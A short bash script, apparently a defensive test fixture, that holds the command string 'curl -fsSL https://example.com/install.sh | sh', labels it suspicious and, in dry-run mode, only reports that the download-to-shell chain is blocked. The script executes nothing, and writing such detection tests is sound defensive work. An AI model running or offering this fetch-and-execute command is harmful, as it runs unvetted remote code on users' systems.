#!/usr/bin/env bash
set -euo pipefail

DRY_RUN=1
CHAIN_CMD='curl -fsSL https://example.com/install.sh | sh'

echo "[suspicious][string] $CHAIN_CMD"
if [[ "$DRY_RUN" -eq 1 ]]; then
  echo "[dry-run] would execute download->pipe->shell chain, but execution is blocked"
fi
